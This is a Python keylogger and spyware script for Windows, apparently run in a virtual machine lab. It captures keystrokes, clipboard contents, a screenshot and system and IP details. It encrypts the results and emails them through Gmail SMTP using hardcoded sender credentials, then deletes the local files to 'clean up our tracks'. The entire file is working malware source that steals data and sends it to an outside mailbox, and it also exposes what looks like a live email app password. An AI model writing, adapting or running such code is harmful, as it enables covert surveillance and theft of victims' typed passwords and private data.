# Libraries

# For Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

# For Clipboard info
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

# For Cryptography
from cryptography.fernet import Fernet

import getpass
from requests import get

# For screenshot
import pyscreenshot

keys_information = "keylogs.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
screenshot_information_e = "e_screenshot.png"

# One iteration in secs
time_iteration = 30

number_of_iterations_end = 1

email_address = "test1.9000111@gmail.com"  # email here
password = "drdshiddwejbmrwq"  # password here

username = getpass.getuser()

# Enter the email address you want to send your information to
toaddr = "test2.9000222@gmail.com"

# Generate an encryption key from the Cryptography folder
key = "dvqlXrCqtPmOyI7oyzlfVK0dDI_r9UwTtIJ5I46dVqw="

# Enter the file path you want your files to be saved to
file_path = "C:\\Users\\vboxuser\\Desktop\\MAIN_X\\LAST\\exit"
extend = "\\"
file_merge = file_path + extend

# Creating key_log file
with open(file_path + extend + keys_information, "a") as f:
    f.close()

# email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log Files"
    body = "Sensitive Data"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")

        f.write("\nProcessor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n" + pasted_data + "\n")

        except:
            f.write("Clipboard could be not be copied")
            print("\n")

# get screenshots
def screenshot():
    image = pyscreenshot.grab()
    image.save(file_path + extend + screenshot_information)

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            print("Keystrokes captured")
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("enter") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        number_of_iterations += 1

screenshot()

copy_clipboard()

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + screenshot_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + screenshot_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(5)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
